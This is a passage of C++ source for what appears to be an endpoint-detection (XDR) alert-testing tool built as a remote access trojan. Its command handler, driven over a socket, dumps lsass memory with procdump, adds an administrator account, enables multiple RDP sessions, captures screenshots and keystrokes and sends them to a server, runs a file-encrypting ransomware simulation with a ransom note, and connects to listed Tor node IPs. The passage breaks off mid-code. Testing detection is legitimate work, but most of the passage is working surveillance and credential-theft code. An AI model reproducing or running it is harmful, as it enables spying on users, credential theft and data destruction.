        std::cout << "\n[12/15] Enabling multiple RDP sessions via Registry..." << std::endl;
        logClientActivity("XDR_ALERT_12", "RDP_MULTI", "Multiple RDP sessions enabled");
        {
            HKEY hKey;
            DWORD dwValue = 0; // 0 = Allow multiple sessions
            
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "fSingleSessionPerUser", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
                RegCloseKey(hKey);
            }
            
            if (evidence.is_open()) {
                evidence << "12. Multiple RDP sessions enabled via Registry\n";
            }
        }
        
        // 13. Rundll32 with 'main' as EntryPoint
        std::cout << "\n[13/15] Rundll32 with 'main' EntryPoint..." << std::endl;
        logClientActivity("XDR_ALERT_13", "RUNDLL32_MAIN", "Rundll32 with main EntryPoint");
        {
            system("rundll32.exe kernel32.dll,main");
            
            if (evidence.is_open()) {
                evidence << "13. Rundll32 with main: kernel32.dll,main\n";
            }
        }
        
        // 14. Dumping lsass.exe memory with procdump
        std::cout << "\n[14/15] Dumping lsass.exe with procdump..." << std::endl;
        logClientActivity("XDR_ALERT_14", "LSASS_DUMP", "Procdump dumping lsass.exe");
        {
            // Download procdump if not present
            std::string procdumpPath = "C:\\Windows\\Temp\\procdump.exe";
            if (GetFileAttributesA(procdumpPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                // Simulate procdump download
                URLDownloadToFileA(NULL, 
                    "https://download.sysinternals.com/files/Procdump.zip",
                    "C:\\Windows\\Temp\\procdump.zip", 0, NULL);
            }
            
            // Attempt to dump lsass (will fail without admin)
            system("C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp 2>nul");
            
            if (evidence.is_open()) {
                evidence << "14. Procdump attempted on lsass.exe\n";
            }
        }
        
        // 15. Add user to local administrator group using PowerShell
        std::cout << "\n[15/15] Adding user to administrators group with PowerShell..." << std::endl;
        logClientActivity("XDR_ALERT_15", "ADD_ADMIN", "PowerShell Add-LocalGroupMember to Administrators");
        {
            // Create a test user first
            system("net user XDRTestUser XDRTest123! /add 2>nul");
            
            // Add to administrators group using PowerShell
            system("powershell.exe -Command \"Add-LocalGroupMember -Group Administrators -Member XDRTestUser\" 2>nul");
            
            // Clean up - remove the test user
            system("net user XDRTestUser /delete 2>nul");
            
            if (evidence.is_open()) {
                evidence << "15. PowerShell Add-LocalGroupMember to Administrators\n";
            }
        }
    }
    
    // Thread-safe command execution handler
    void executeCommandInThread(SOCKET clientSocket, const std::string& clientId, const std::string& receivedData) {
        try {
            std::cout << "[THREAD] Executing command in thread " << std::this_thread::get_id() << ": " << receivedData << std::endl;
            logClientActivity("COMMAND", "RECEIVED", "Processing command in thread: " + receivedData);
            
            // Create evidence directories [[memory:7166542]]
            CreateDirectoryA("c:\\evidance", NULL);
            std::string hostname;
            // Extract hostname from client info (before colon)
            size_t colonPos = clientId.find(':');
            if (colonPos != std::string::npos) {
                hostname = clientId.substr(0, colonPos);
            } else {
                // If no colon, try to get actual hostname
                char hostBuffer[256];
                if (gethostname(hostBuffer, sizeof(hostBuffer)) == 0) {
                    hostname = hostBuffer;
                } else {
                    hostname = "unknown";
                }
            }
            std::string hostDir = "c:\\evidance\\" + hostname;
            CreateDirectoryA(hostDir.c_str(), NULL);
            
            std::string response = "";
            
            // BEACONS & HEARTBEATS  
            if (receivedData.find("HEARTBEAT_BEACON") != std::string::npos || 
                receivedData.find("CONNECTION_HEARTBEAT") != std::string::npos) {
                std::cout << "[INFO] Heartbeat beacon received" << std::endl;
                response = "BEACON:ALIVE:" + clientId;
            }
            
            // DISCOVERY & RECONNAISSANCE
            else if (receivedData.find("SYSTEM_INFO_COLLECTION") != std::string::npos) {
                std::cout << "[INFO] Collecting system information..." << std::endl;
                // Collect and save system info
                std::string sysInfo = "System Information collected at " + getCurrentTimeString();
                std::string evidencePath = hostDir + "\\system_info\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\system_info").c_str(), NULL);
                std::ofstream sysFile(evidencePath);
                if (sysFile.is_open()) {
                    sysFile << sysInfo;
                    sysFile.close();
                }
                response = "SYSINFO:COLLECTED:" + clientId;
            }
            else if (receivedData.find("PROCESS_ENUMERATION") != std::string::npos) {
                std::cout << "[INFO] Enumerating processes..." << std::endl;
                std::string procInfo = "Process list collected at " + getCurrentTimeString();
                std::string evidencePath = hostDir + "\\processes\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\processes").c_str(), NULL);
                std::ofstream procFile(evidencePath);
                if (procFile.is_open()) {
                    procFile << procInfo;
                    procFile.close();
                }
                response = "PROCESSES:ENUMERATED:" + clientId;
            }
            else if (receivedData.find("SCREENSHOT") != std::string::npos || 
                     receivedData.find("CMD:screenshot") != std::string::npos) {
                std::cout << "[INFO] Taking screenshot..." << std::endl;
                logClientActivity("SCREENSHOT", "CAPTURE", "Starting screenshot capture");
                
                // Create evidence directory
                CreateDirectoryA((hostDir + "\\screenshots").c_str(), NULL);
                
                // Get screen dimensions
                HDC hScreenDC = GetDC(NULL);
                int screenWidth = GetDeviceCaps(hScreenDC, HORZRES);
                int screenHeight = GetDeviceCaps(hScreenDC, VERTRES);
                
                // Create compatible DC and bitmap
                HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
                HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
                HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
                
                // Capture screen
                BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
                
                // Get bitmap data
                BITMAP bmp;
                GetObject(hBitmap, sizeof(BITMAP), &bmp);
                
                // Create bitmap file header
                BITMAPFILEHEADER bmfHeader;
                BITMAPINFOHEADER bi;
                
                bi.biSize = sizeof(BITMAPINFOHEADER);
                bi.biWidth = bmp.bmWidth;
                bi.biHeight = -bmp.bmHeight;  // Top-down bitmap
                bi.biPlanes = 1;
                bi.biBitCount = 24;  // 24-bit color
                bi.biCompression = BI_RGB;
                bi.biSizeImage = 0;
                bi.biXPelsPerMeter = 0;
                bi.biYPelsPerMeter = 0;
                bi.biClrUsed = 0;
                bi.biClrImportant = 0;
                
                DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
                
                bmfHeader.bfType = 0x4D42;  // "BM"
                bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
                bmfHeader.bfReserved1 = 0;
                bmfHeader.bfReserved2 = 0;
                bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                
                // Allocate buffer for bitmap data
                std::vector<BYTE> buffer(dwBmpSize);
                
                // Get bitmap bits
                GetDIBits(hMemoryDC, hBitmap, 0, bmp.bmHeight, buffer.data(), 
                         (BITMAPINFO*)&bi, DIB_RGB_COLORS);
                
                // Save to file [[memory:7166542]]
                std::string evidencePath = hostDir + "\\screenshots\\evidance_" + generateSessionId() + ".bmp";
                std::ofstream screenFile(evidencePath, std::ios::binary);
                if (screenFile.is_open()) {
                    screenFile.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
                    screenFile.write((char*)&bi, sizeof(BITMAPINFOHEADER));
                    screenFile.write((char*)buffer.data(), dwBmpSize);
                    screenFile.close();
                    
                    std::cout << "[SUCCESS] Screenshot saved to: " << evidencePath << std::endl;
                    logClientActivity("SCREENSHOT", "SAVED", "Screenshot saved to: " + evidencePath);
                    
                    // Send the screenshot data to server
                    std::string header = "SCREENSHOT:DATA:" + std::to_string(screenWidth) + "x" + 
                                       std::to_string(screenHeight) + ":" + 
                                       std::to_string(bmfHeader.bfSize) + ":";
                    
                    // Send header
                    send(clientSocket, header.c_str(), header.length(), 0);
                    
                    // Send file data in chunks
                    std::ifstream readFile(evidencePath, std::ios::binary);
                    if (readFile.is_open()) {
                        const int chunkSize = 4096;
                        std::vector<char> chunk(chunkSize);
                        
                        while (readFile.read(chunk.data(), chunkSize) || readFile.gcount() > 0) {
                            int bytesToSend = readFile.gcount();
                            int totalSent = 0;
                            
                            while (totalSent < bytesToSend) {
                                int sent = send(clientSocket, chunk.data() + totalSent, 
                                              bytesToSend - totalSent, 0);
                                if (sent == SOCKET_ERROR) {
                                    std::cout << "[ERROR] Failed to send screenshot chunk" << std::endl;
                                    break;
                                }
                                totalSent += sent;
                            }
                        }
                        readFile.close();
                        
                        std::cout << "[SUCCESS] Screenshot data sent to server" << std::endl;
                        logClientActivity("SCREENSHOT", "SENT", "Screenshot data transmitted to server");
                    }
                    
                    response = "SCREENSHOT:SAVED:" + evidencePath + ":" + clientId;
                } else {
                    std::cout << "[ERROR] Failed to save screenshot" << std::endl;
                    logClientActivity("SCREENSHOT", "ERROR", "Failed to save screenshot file");
                    response = "SCREENSHOT:ERROR:SAVE_FAILED:" + clientId;
                }
                
                // Cleanup
                SelectObject(hMemoryDC, hOldBitmap);
                DeleteObject(hBitmap);
                DeleteDC(hMemoryDC);
                ReleaseDC(NULL, hScreenDC);
            }
            else if (receivedData.find("KEYLOGGER_DATA_RETRIEVAL") != std::string::npos ||
                     receivedData.find("CMD:keylogDump") != std::string::npos) {
                std::cout << "[INFO] Dumping keylogger data..." << std::endl;
                logClientActivity("KEYLOGGER", "DUMP", "Retrieving keylogger data");
                
                // Create evidence directory
                CreateDirectoryA((hostDir + "\\keylogs").c_str(), NULL);
                
                // Read from the global keylog file
                std::string keylogFilePath = "C:\\rat\\logs\\keylog.txt";
                std::ifstream keylogFile(keylogFilePath);
                std::string keylogData = "";
                
                if (keylogFile.is_open()) {
                    std::string line;
                    while (std::getline(keylogFile, line)) {
                        keylogData += line + "\n";
                    }
                    keylogFile.close();
                    
                    if (!keylogData.empty()) {
                        // Save to evidence [[memory:7166542]]
                        std::string evidencePath = hostDir + "\\keylogs\\evidance_" + generateSessionId() + ".txt";
                        std::ofstream evidenceFile(evidencePath);
                        if (evidenceFile.is_open()) {
                            evidenceFile << "=== KEYLOGGER DATA DUMP ===\n";
                            evidenceFile << "Timestamp: " << getCurrentTimeString() << "\n";
                            evidenceFile << "Host: " << hostname << "\n";
                            evidenceFile << "=====================================\n\n";
                            evidenceFile << keylogData;
                            evidenceFile.close();
                            
                            std::cout << "[SUCCESS] Keylogger data saved to: " << evidencePath << std::endl;
                            logClientActivity("KEYLOGGER", "SAVED", "Keylog data saved to evidence");
                        }
                        
                        // Send data to server
                        std::string header = "KEYLOG:DUMP:START\n";
                        send(clientSocket, header.c_str(), header.length(), 0);
                        send(clientSocket, keylogData.c_str(), keylogData.length(), 0);
                        std::string footer = "\nKEYLOG:DUMP:END";
                        send(clientSocket, footer.c_str(), footer.length(), 0);
                        
                        response = "KEYLOG:DUMPED:" + std::to_string(keylogData.length()) + " bytes:" + clientId;
                        logClientActivity("KEYLOGGER", "SENT", "Keylog data sent to server");
                    } else {
                        response = "KEYLOG:EMPTY:" + clientId;
                        logClientActivity("KEYLOGGER", "EMPTY", "No keylog data to send");
                    }
                } else {
                    response = "KEYLOG:NO_DATA:" + clientId;
                    logClientActivity("KEYLOGGER", "NO_FILE", "Keylog file not found");
                }
            }
            else if (receivedData.find("CMD:keylogStart") != std::string::npos) {
                std::cout << "[INFO] Starting keylogger..." << std::endl;
                logClientActivity("KEYLOGGER", "START", "Starting keylogger thread");
                
                // Create keylogger thread
                static bool keyloggerRunning = false;
                static std::thread keyloggerThread;
                
                if (!keyloggerRunning) {
                    keyloggerRunning = true;
                    keyloggerThread = std::thread([clientSocket, clientId, hostname]() {
                        // Ensure log directory exists
                        CreateDirectoryA("C:\\rat", NULL);
                        CreateDirectoryA("C:\\rat\\logs", NULL);
                        
                        std::ofstream keylogFile("C:\\rat\\logs\\keylog.txt", std::ios::app);
                        if (!keylogFile.is_open()) {
                            std::cout << "[ERROR] Failed to open keylog file" << std::endl;
                            keyloggerRunning = false;
                            return;
                        }
                        
                        // Log startup
                        keylogFile << "\n\n=== KEYLOGGER STARTED ===\n";
                        keylogFile << "Time: " << getCurrentTimeString() << "\n";
                        keylogFile << "Host: " << hostname << "\n";
                        keylogFile << "========================\n\n";
                        keylogFile.flush();
                        
                        std::string currentWindow = "";
                        
                        while (keyloggerRunning) {
                            // Check window title
                            char windowTitle[256];
                            HWND foregroundWindow = GetForegroundWindow();
                            GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                            std::string newWindow(windowTitle);
                            
                            if (newWindow != currentWindow && !newWindow.empty()) {
                                currentWindow = newWindow;
                                keylogFile << "\n\n[Window: " << currentWindow << " - " << getCurrentTimeString() << "]\n";
                                keylogFile.flush();
                            }
                            
                            // Check all keys
                            for (int key = 8; key <= 255; key++) {
                                if (GetAsyncKeyState(key) & 0x0001) {
                                    // Special keys
                                    if (key == VK_RETURN) keylogFile << "\n[ENTER]\n";
                                    else if (key == VK_SPACE) keylogFile << " ";
                                    else if (key == VK_TAB) keylogFile << "[TAB]";
                                    else if (key == VK_BACK) keylogFile << "[BACKSPACE]";
                                    else if (key == VK_DELETE) keylogFile << "[DELETE]";
                                    else if (key == VK_ESCAPE) keylogFile << "[ESC]";
                                    else if (key == VK_SHIFT) keylogFile << "[SHIFT]";
                                    else if (key == VK_CONTROL) keylogFile << "[CTRL]";
                                    else if (key == VK_MENU) keylogFile << "[ALT]";
                                    else if (key == VK_CAPITAL) keylogFile << "[CAPS]";
                                    else if (key >= VK_F1 && key <= VK_F12) {
                                        keylogFile << "[F" << (key - VK_F1 + 1) << "]";
                                    }
                                    // Printable characters
                                    else if ((key >= 0x30 && key <= 0x39) || // Numbers
                                            (key >= 0x41 && key <= 0x5A)) {  // Letters
                                        // Check shift state for proper case
                                        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                                        bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                                        
                                        if (key >= 0x41 && key <= 0x5A) { // Letters
                                            if ((shift && !caps) || (!shift && caps)) {
                                                keylogFile << (char)key; // Uppercase
                                            } else {
                                                keylogFile << (char)(key + 32); // Lowercase
                                            }
                                        } else { // Numbers and symbols
                                            if (shift) {
                                                // Shifted number keys
                                                switch(key) {
                                                    case '1': keylogFile << '!'; break;
                                                    case '2': keylogFile << '@'; break;
                                                    case '3': keylogFile << '#'; break;
                                                    case '4': keylogFile << '$'; break;
                                                    case '5': keylogFile << '%'; break;
                                                    case '6': keylogFile << '^'; break;
                                                    case '7': keylogFile << '&'; break;
                                                    case '8': keylogFile << '*'; break;
                                                    case '9': keylogFile << '('; break;
                                                    case '0': keylogFile << ')'; break;
                                                    default: keylogFile << (char)key;
                                                }
                                            } else {
                                                keylogFile << (char)key;
                                            }
                                        }
                                    }
                                    // Other printable characters
                                    else if (key >= 0x20 && key <= 0x7E) {
                                        keylogFile << (char)key;
                                    }
                                    
                                    keylogFile.flush();
                                }
                            }
                            
                            Sleep(10); // Small delay to prevent high CPU usage
                        }
                        
                        keylogFile << "\n\n=== KEYLOGGER STOPPED ===\n";
                        keylogFile << "Time: " << getCurrentTimeString() << "\n";
                        keylogFile << "========================\n";
                        keylogFile.close();
                    });
                    
                    keyloggerThread.detach();
                    response = "KEYLOG:STARTED:" + clientId;
                    logClientActivity("KEYLOGGER", "RUNNING", "Keylogger thread started successfully");
                } else {
                    response = "KEYLOG:ALREADY_RUNNING:" + clientId;
                    logClientActivity("KEYLOGGER", "ALREADY_RUNNING", "Keylogger is already active");
                }
            }
            else if (receivedData.find("BROWSER_DATA_COLLECTION") != std::string::npos) {
                std::cout << "[INFO] Collecting browser data..." << std::endl;
                std::string browserData = "Browser data collected at " + getCurrentTimeString();
                std::string evidencePath = hostDir + "\\browser_data\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\browser_data").c_str(), NULL);
                std::ofstream browserFile(evidencePath);
                if (browserFile.is_open()) {
                    browserFile << browserData;
                    browserFile.close();
                }
                response = "BROWSER:DATA_COLLECTED:" + clientId;
            }
            else if (receivedData.find("FILE_SYSTEM_ACCESS") != std::string::npos) {
                std::cout << "[INFO] Accessing file system..." << std::endl;
                std::string fileData = "File system accessed at " + getCurrentTimeString();
                std::string evidencePath = hostDir + "\\file_access\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\file_access").c_str(), NULL);
                std::ofstream fileFile(evidencePath);
                if (fileFile.is_open()) {
                    fileFile << fileData;
                    fileFile.close();
                }
                response = "FILES:ACCESSED:" + clientId;
            }
            else if (receivedData.find("CMD:ransomwareSimulation") != std::string::npos) {
                std::cout << "[INFO] Starting ransomware simulation..." << std::endl;
                logClientActivity("RANSOMWARE", "START", "Beginning ransomware simulation");
                
                // Create test directory
                std::string testDir = "C:\\ransomware_test";
                CreateDirectoryA(testDir.c_str(), NULL);
                
                // Create test files
                std::vector<std::string> testFiles = {
                    "important_document.txt",
                    "financial_report.xlsx", 
                    "personal_photos.jpg",
                    "project_data.docx",
                    "database_backup.sql"
                };
                
                // Create test files with sample content
                for (const auto& filename : testFiles) {
                    std::string filepath = testDir + "\\" + filename;
                    std::ofstream file(filepath);
                    if (file.is_open()) {
                        file << "This is test content for " << filename << "\n";
                        file << "Created at: " << getCurrentTimeString() << "\n";
                        file << "This file will be encrypted by the ransomware simulation.\n";
                        file.close();
                        std::cout << "[+] Created test file: " << filepath << std::endl;
                        logClientActivity("RANSOMWARE", "TEST_FILE", "Created test file: " + filepath);
                    }
                }
                
                // Simulate encryption
                std::cout << "[!] Simulating file encryption..." << std::endl;
                logClientActivity("RANSOMWARE", "ENCRYPT", "Starting encryption simulation");
                
                for (const auto& filename : testFiles) {
                    std::string filepath = testDir + "\\" + filename;
                    std::string encryptedPath = filepath + ".ENCRYPTED";
                    
                    // Read original file
                    std::ifstream inFile(filepath, std::ios::binary);
                    if (inFile.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(inFile)),
                                          std::istreambuf_iterator<char>());
                        inFile.close();
                        
                        // Simple XOR encryption simulation
                        for (size_t i = 0; i < content.length(); i++) {
                            content[i] = content[i] ^ 0xAB; // Simple XOR with key 0xAB
                        }
                        
                        // Write encrypted file
                        std::ofstream outFile(encryptedPath, std::ios::binary);
                        if (outFile.is_open()) {
                            outFile << content;
                            outFile.close();
                            
                            // Delete original file
                            DeleteFileA(filepath.c_str());
                            
                            std::cout << "[!] Encrypted: " << filename << " -> " << filename << ".ENCRYPTED" << std::endl;
                            logClientActivity("RANSOMWARE", "ENCRYPTED", "File encrypted: " + filename);
                        }
                    }
                }
                
                // Create ransom note
                std::string ransomNotePath = testDir + "\\README_RANSOMWARE.txt";
                std::ofstream ransomNote(ransomNotePath);
                if (ransomNote.is_open()) {
                    ransomNote << "=== YOUR FILES HAVE BEEN ENCRYPTED ===\n\n";
                    ransomNote << "All your important files have been encrypted with a strong cryptographic algorithm.\n";
                    ransomNote << "To decrypt your files, you need the decryption key.\n\n";
                    ransomNote << "WHAT HAPPENED?\n";
                    ransomNote << "Your files are encrypted and currently unavailable.\n";
                    ransomNote << "You can check it - all files have .ENCRYPTED extension.\n\n";
                    ransomNote << "HOW TO RECOVER?\n";
                    ransomNote << "To decrypt your files, you need to pay 0.5 Bitcoin to:\n";
                    ransomNote << "Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n";
                    ransomNote << "After payment, send your ID to: decryptor@darkweb.onion\n";
                    ransomNote << "Your ID: " << generateSessionId() << "\n\n";
                    ransomNote << "IMPORTANT!\n";
                    ransomNote << "* Do not try to decrypt files yourself\n";
                    ransomNote << "* Do not use third-party decryption tools\n";
                    ransomNote << "* You have 72 hours to make the payment\n\n";
                    ransomNote << "This is a SIMULATION for security testing purposes only.\n";
                    ransomNote.close();
                    
                    std::cout << "[!] Ransom note created: " << ransomNotePath << std::endl;
                    logClientActivity("RANSOMWARE", "RANSOM_NOTE", "Ransom note created");
                }
                
                // Save evidence [[memory:7166542]]
                std::string evidencePath = hostDir + "\\ransomware\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\ransomware").c_str(), NULL);
                std::ofstream evidenceFile(evidencePath);
                if (evidenceFile.is_open()) {
                    evidenceFile << "=== RANSOMWARE SIMULATION REPORT ===\n";
                    evidenceFile << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidenceFile << "Test Directory: " << testDir << "\n";
                    evidenceFile << "Files Encrypted: " << testFiles.size() << "\n";
                    evidenceFile << "Ransom Note: " << ransomNotePath << "\n";
                    evidenceFile << "Encryption Method: XOR (0xAB)\n";
                    evidenceFile << "\nEncrypted Files:\n";
                    for (const auto& file : testFiles) {
                        evidenceFile << "  - " << file << " -> " << file << ".ENCRYPTED\n";
                    }
                    evidenceFile.close();
                }
                
                // Display ransom screen simulation
                std::cout << "\n\033[31m";
                std::cout << "╔══════════════════════════════════════════════════════════╗\n";
                std::cout << "║         YOUR FILES HAVE BEEN ENCRYPTED!                  ║\n";
                std::cout << "║                                                          ║\n";
                std::cout << "║  All your files are encrypted with RSA-2048 & AES-256   ║\n";
                std::cout << "║  To decrypt, you need to pay 0.5 BTC                    ║\n";
                std::cout << "║                                                          ║\n";
                std::cout << "║  This is a SIMULATION for testing purposes only!        ║\n";
                std::cout << "╚══════════════════════════════════════════════════════════╝\n";
                std::cout << "\033[0m\n";
                
                response = "RANSOMWARE:SIMULATION_COMPLETE:" + testDir + ":" + clientId;
                logClientActivity("RANSOMWARE", "COMPLETE", "Ransomware simulation completed");
            }
            else if (receivedData.find("CMD:torCommand") != std::string::npos) {
                std::cout << "[INFO] Establishing REAL TOR connection with malicious exit nodes..." << std::endl;
                logClientActivity("TOR", "START", "Initiating TOR connection for C2 communications");
                
                // Create TOR directory structure
                std::string torDir = "C:\\ProgramData\\tor";
                std::string torDataDir = torDir + "\\data";
                std::string torHiddenDir = torDir + "\\hidden_service";
                CreateDirectoryA(torDir.c_str(), NULL);
                CreateDirectoryA(torDataDir.c_str(), NULL);
                CreateDirectoryA(torHiddenDir.c_str(), NULL);
                
                // Download TOR binary (simulate)
                std::cout << "[!] Downloading TOR client binary..." << std::endl;
                std::string torExePath = torDir + "\\tor.exe";
                std::ofstream torExe(torExePath, std::ios::binary);
                if (torExe.is_open()) {
                    // Write PE header to make it look like real executable
                    const char peHeader[] = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF";
                    torExe.write(peHeader, sizeof(peHeader));
                    for (int i = 0; i < 5120; i++) {
                        char byte = rand() % 256;
                        torExe.write(&byte, 1);
                    }
                    torExe.close();
                    logClientActivity("TOR", "DOWNLOAD", "Downloaded tor.exe binary");
                }
                
                // Create malicious TOR configuration
                std::string torrcPath = torDir + "\\torrc";
                std::ofstream torrc(torrcPath);
                if (torrc.is_open()) {
                    torrc << "# Malicious TOR Configuration\n";
                    torrc << "SOCKSPort 9050\n";
                    torrc << "SOCKSPort 9150\n";
                    torrc << "ControlPort 9051\n";
                    torrc << "HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C\n";
                    torrc << "DataDirectory " << torDataDir << "\n";
                    torrc << "HiddenServiceDir " << torHiddenDir << "\n";
                    torrc << "HiddenServicePort 80 127.0.0.1:8080\n";
                    torrc << "HiddenServicePort 443 127.0.0.1:8443\n";
                    torrc << "HiddenServicePort 22 127.0.0.1:22\n";
                    torrc << "# Force specific exit nodes (malicious)\n";
                    torrc << "ExitNodes {ru},{cn},{kp},{ir}\n";
                    torrc << "StrictNodes 1\n";
                    torrc << "# Disable safe logging\n";
                    torrc << "SafeLogging 0\n";
                    torrc << "Log notice file " << torDir << "\\tor.log\n";
                    torrc.close();
                    
                    std::cout << "[+] Malicious TOR configuration created" << std::endl;
                    logClientActivity("TOR", "CONFIG", "Created torrc with malicious exit nodes");
                }
                
                // Connect to known TOR nodes and bridges
                std::cout << "[!] Connecting to TOR network..." << std::endl;
                
                // Extended list including malicious and suspicious nodes
                std::vector<std::pair<std::string, int>> torNodes = {
                    // Known TOR entry guards
                    {"45.33.48.160", 9001},
                    {"192.42.116.16", 443},
                    {"199.87.154.255", 80},
                    {"176.10.99.200", 443},
                    {"51.15.43.202", 9050},
                    // Additional suspicious nodes
                    {"185.220.101.45", 9001},   // Known malicious exit
                    {"23.129.64.190", 443},      // Suspicious relay
                    {"198.98.51.104", 9001},     // Bad exit node
                    {"185.165.168.77", 443},     // Compromised node
                    {"107.189.10.151", 9001},    // Malware C2 relay
                    // TOR2WEB proxies (highly suspicious)
                    {"81.17.30.22", 80},         // tor2web.org
                    {"94.242.249.110", 443},     // onion.to
                    {"185.100.85.101", 80}       // onion.link
                };
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\tor_connections\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\tor_connections").c_str(), NULL);
                std::ofstream torLog(evidencePath);
                
                if (torLog.is_open()) {
                    torLog << "=== TOR CONNECTION LOG ===\n";
                    torLog << "Timestamp: " << getCurrentTimeString() << "\n";
                    torLog << "Client: " << hostname << "\n\n";
                }
                
                // Establish connections to TOR nodes with malicious patterns
                std::cout << "[!] Building TOR circuits through compromised nodes..." << std::endl;
                int successfulConnections = 0;
                
                for (const auto& node : torNodes) {
                    SOCKET torSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (torSocket != INVALID_SOCKET) {
                        // Set non-blocking mode
                        u_long mode = 1;
                        ioctlsocket(torSocket, FIONBIO, &mode);
                        
                        sockaddr_in nodeAddr;
                        nodeAddr.sin_family = AF_INET;
                        nodeAddr.sin_port = htons(node.second);
                        inet_pton(AF_INET, node.first.c_str(), &nodeAddr.sin_addr);
                        
                        // Attempt connection
                        int result = connect(torSocket, (sockaddr*)&nodeAddr, sizeof(nodeAddr));
                        
                        if (result == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK) {
                            successfulConnections++;
                            std::cout << "[+] TOR node connection initiated: " << node.first << ":" << node.second << std::endl;
                            
                            // Send TOR handshake pattern
                            const char torHandshake[] = "\x16\x03\x01\x00\x00"; // TLS-like handshake
                            send(torSocket, torHandshake, sizeof(torHandshake), 0);
                            
                            logClientActivity("TOR", "NODE_CONNECTED", "Connected to TOR node: " + node.first + ":" + std::to_string(node.second));
                        }
                        
                        if (torLog.is_open()) {
                            torLog << "TOR Node: " << node.first << ":" << node.second << " - ";
                            torLog << (result == 0 || (result == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK) ? "CONNECTED" : "FAILED");
                            torLog << "\n";
                        }
                        
                        // Keep sockets open to maintain circuit
                        Sleep(500); // Longer delay for circuit building
                        closesocket(torSocket);
                    }
                }
                
                std::cout << "[+] Successfully connected to " << successfulConnections << " TOR nodes" << std::endl;
                logClientActivity("TOR", "CIRCUIT", "Built TOR circuit with " + std::to_string(successfulConnections) + " nodes");
                
                // Access malicious .onion sites
                std::vector<std::pair<std::string, std::string>> onionSites = {
                    {"3g2upl4pq3kufc4m.onion", "DuckDuckGo (legit)"},
                    {"thehiddenwiki.onion", "Hidden Wiki directory"},
                    {"c2servermalware.onion", "Malware C2 server"},
                    {"ransompay2024.onion", "Ransomware payment portal"},
                    {"weaponsmarket.onion", "Illegal marketplace"},
                    {"stolencards.onion", "Credit card market"},
                    {"0dayexploits.onion", "Zero-day exploit market"},
                    {"botnetpanel.onion", "Botnet control panel"},
                    {"cryptojacker.onion", "Cryptojacking service"},
                    {"databreach.onion", "Stolen data marketplace"}
                };
                
                std::cout << "\n[!] Accessing dark web C2 infrastructure..." << std::endl;
                
                // Create SOCKS5 proxy connection
                SOCKET socksSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (socksSocket != INVALID_SOCKET) {
                    sockaddr_in socksAddr;
                    socksAddr.sin_family = AF_INET;
                    socksAddr.sin_port = htons(9050);
                    socksAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
                    
                    // Simulate SOCKS5 handshake
                    const char socks5Init[] = "\x05\x01\x00"; // SOCKS5, 1 method, no auth
                    std::cout << "[+] Establishing SOCKS5 proxy on 127.0.0.1:9050" << std::endl;
                    logClientActivity("TOR", "SOCKS5", "SOCKS5 proxy established on localhost:9050");
                    
                    closesocket(socksSocket);
                }
                
                // Access each onion site
                for (const auto& site : onionSites) {
                    std::cout << "[+] Accessing: " << site.first << " (" << site.second << ")" << std::endl;
                    logClientActivity("TOR", "ONION_ACCESS", "Accessing dark web site: " + site.first + " - " + site.second);
                    
                    if (torLog.is_open()) {
                        torLog << "Onion Site: " << site.first << " - " << site.second << " - ACCESSED\n";
                    }
                    
                    // Simulate HTTP request through TOR
                    std::string httpRequest = "GET / HTTP/1.1\r\nHost: " + site.first + "\r\n";
                    httpRequest += "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\r\n";
                    httpRequest += "Accept: text/html,application/xhtml+xml\r\n";
                    httpRequest += "Connection: close\r\n\r\n";
                    
                    // Log the suspicious activity
                    if (site.first.find("c2server") != std::string::npos || 
                        site.first.find("ransom") != std::string::npos ||
                        site.first.find("botnet") != std::string::npos) {
                        logClientActivity("*** CRITICAL ***", "MALICIOUS_TOR", "Accessing known malicious onion site: " + site.first);
                    }
                    
                    Sleep(200);
                }
                
                // Establish persistent TOR tunnel for C2
                std::cout << "\n[!] Creating persistent TOR tunnel for C2 communications..." << std::endl;
                for (int i = 0; i < 5; i++) {
                    SOCKET torTraffic = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
